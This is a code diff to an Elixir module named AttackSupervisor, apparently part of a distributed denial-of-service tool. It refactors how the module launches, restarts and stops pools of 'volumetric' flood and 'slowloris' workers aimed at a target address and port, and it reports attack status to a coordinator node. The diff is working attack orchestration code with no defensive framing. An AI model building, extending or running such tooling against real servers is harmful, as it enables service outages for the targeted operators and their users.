@@ -20,29 +20,44 @@ defmodule AttackSupervisor do
   end
 
 
-  # start_workers could do with more error checking
-
-
-  defp start_workers(attack_type, worker_count, target_address, target_port) do
-    start_workers(attack_type, worker_count, target_address, target_port, nil)
+  defp start_volumetric(worker_count, target_address, target_port) do
+    start_volumetric(worker_count, target_address, target_port, [])
   end
 
 
-  defp start_workers(attack_type, worker_count, target_address, target_port, transmission_interval) do
-    start_workers(attack_type, worker_count, target_address, target_port, transmission_interval, [])
-  end
-
-
-  # Recursive stop condition for starting workers.
-  defp start_workers(_, 0, _, _, _, started_workers) do
+  # Recursive stop condition for starting volumetric workers.
+  defp start_volumetric(0, _, _, started_workers) do
     {:ok, started_workers}
   end
 
-  # Recursively start and link attack workers with the given parameters
-  defp start_workers(attack_type, worker_count, target_address, target_port, transmission_interval, started_workers) do
-    pid = AttackWorker.start_link(attack_type, target_address, target_port, transmission_interval)
-    start_workers(
-      attack_type,
+
+  # Recursively start and link volumetric attack workers with the given parameters
+  defp start_volumetric(worker_count, target_address, target_port, started_workers) do
+    pid = AttackWorker.start_link("volumetric", target_address, target_port)
+    start_volumetric(
+      worker_count - 1,
+      target_address,
+      target_port,
+      [pid | started_workers]
+    )
+  end
+
+
+  defp start_slowloris(worker_count, target_address, target_port, transmission_interval) do
+    start_slowloris(worker_count, target_address, target_port, transmission_interval, [])
+  end
+
+
+  # Recursive stop condition for starting slowloris workers.
+  defp start_slowloris(0, _, _, _, started_workers) do
+    {:ok, started_workers}
+  end
+
+
+  # Recursively start and link slowloris attack workers with the given parameters
+  defp start_slowloris(worker_count, target_address, target_port, transmission_interval, started_workers) do
+    pid = AttackWorker.start_link("slowloris", target_address, target_port, transmission_interval)
+    start_slowloris(
       worker_count - 1,
       target_address,
       target_port,
@@ -51,20 +66,25 @@ defmodule AttackSupervisor do
     )
   end
 
+
   defp stop_workers([]) do
     :ok
   end
 
+
   defp stop_workers([pid | worker_list]) do
+    Logger.info("Sending stop signal to #{inspect pid}")
     AttackWorker.stop(pid)
     stop_workers(worker_list)
   end
+
 
   # Set the processing flag to false when all the workers are done to signal that the attack is complete
   defp loop(true, active_workers, coordinator, _) when length(active_workers) == 0 do
     send(coordinator, {:attack_update, Node.self(), false})
     loop(false, [], coordinator, %{})
   end
+
 
   # Main event loop
   defp loop(processing, active_workers, coordinator, current_attack) do
@@ -79,20 +99,38 @@ defmodule AttackSupervisor do
       {:EXIT, from, reason} ->
         Logger.info("Worker terminated: #{reason}. Restarting...")
 
-        {_, worker_pids} = start_workers(
-          current_attack[:attack_type],
-          1,
-          current_attack[:target_address],
-          current_attack[:target_port],
-          current_attack[:transmission_interval]
-        )
+        case current_attack[:attack_type] do
+          "volumetric" ->
+            {_, worker_pids} = start_volumetric(
+              1,
+              current_attack[:target_address],
+              current_attack[:target_port]
+            )
 
-        loop(
-          processing,
-          [List.first(worker_pids) | List.delete(active_workers, from)],
-          coordinator,
-          current_attack
-        )
+            loop(
+              processing,
+              [List.first(worker_pids) | List.delete(active_workers, from)],
+              coordinator,
+              current_attack
+            )
+
+          "slowloris" ->
+            {_, worker_pids} = start_slowloris(
+              1,
+              current_attack[:target_address],
+              current_attack[:target_port],
+              current_attack[:transmission_interval]
+            )
+
+            loop(
+              processing,
+              [List.first(worker_pids) | List.delete(active_workers, from)],
+              coordinator,
+              current_attack
+            )
+        end
+
+
 
 
       {:start_slowloris, target_address, target_port, workers, transmission_interval} ->
@@ -106,7 +144,7 @@ defmodule AttackSupervisor do
           Logger.info("\tWorkers: #{workers}")
           Logger.info("\tTransmission interval: #{transmission_interval}ms")
 
-          case start_workers("slowloris", workers, target_address, target_port, transmission_interval) do
+          case start_slowloris(workers, target_address, target_port, transmission_interval) do
             {:ok, worker_pids} ->
               send(coordinator, {:attack_update, Node.self(), true, workers})
               loop(
@@ -139,7 +177,7 @@ defmodule AttackSupervisor do
           Logger.info("\tPort: #{target_port}")
           Logger.info("\tWorkers: #{workers}")
 
-          case start_workers("volumetric", workers, target_address, target_port) do
+          case start_volumetric(workers, target_address, target_port) do
             {:ok, worker_pids} ->
               send(coordinator, {:attack_update, Node.self(), true, workers})
               loop(
@@ -150,8 +188,7 @@ defmodule AttackSupervisor do
                   attack_type: "volumetric",
                   target_address: target_address,
                   target_port: target_port,
-                  workers: workers,
-                  transmission_interval: nil
+                  workers: workers
                 }
               )
 
